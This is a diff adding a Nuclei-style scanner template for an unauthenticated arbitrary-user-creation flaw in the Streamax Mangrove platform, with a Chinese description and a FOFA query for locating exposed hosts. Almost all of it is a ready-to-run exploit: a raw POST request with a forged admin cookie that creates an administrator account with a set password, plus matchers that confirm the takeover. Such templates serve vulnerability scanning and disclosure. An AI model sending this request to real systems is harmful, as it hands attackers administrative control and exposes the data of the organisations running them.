@@ -1,0 +1,36 @@
+http:
+    - matchers:
+        - condition: and
+          part: body
+          type: word
+          words:
+            - '"Code":200'
+            - '"Result":true'
+        - status:
+            - 200
+          type: status
+      matchers-condition: and
+      raw:
+        - |
+          POST /Mvsp/RoleUserInfo/Default.do?Action=CreateUser&Type=post&DataType=Text&Guid=1721290869914 HTTP/1.1
+          Host: {{Hostname}}
+          Upgrade-Insecure-http: 1
+          Cookie: MVSP.U=VUlEPTEmVU49YWRtaW4yJkdJRD0xJlJJRD0x;
+          Content-Type: application/x-www-form-urlencoded
+          User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:131.0) Gecko/20100101 Firefox/131.0
+
+          UserId=&GroupPower=1&VehiclePower=&UserName={{username}}&RoleId=1&GroupId=1&ValidTime=&VideoTime=1&Enable=1&TelNo=1&Flow=&WarningFlow=&RealFlow=&MonthlyTime=&Description=&Email=&Password=test1234
+id: ruiming-Mangrove-User-addition
+info:
+    author: Superhero
+    description: |-
+        fofa: body="Mvsp/RegisterLogin/Default.do"
+        锐明技术Mangrove系统 /Mvsp/RoleUserInfo/Default.do?Action=CreateUser 接口处存在任意用户创建漏洞，未经身份验证的远程攻击者可以利用此漏洞创建管理员账户，从而接管系统后台，造成信息泄露，导致系统处于极不安全的状态
+    name: 锐明技术Mangrove系统 任意用户创建漏洞
+    reference:
+        - https://mp.weixin.qq.com/s?__biz=MzkzMTcwMTg1Mg==&mid=2247487989&idx=1&sn=36de2d8cffa01df2ff2afe96ca82bfd6&chksm=c267a4c6f5102dd0cfd9a01660f9dbb04577f303558a3ab2c19c328b0fe51892189fcf6ecaf3&token=48786214&lang=zh_CN#rd
+    severity: high
+    tags:
+        - User addition
+variables:
+    username: '{{to_lower(rand_base(6))}}'
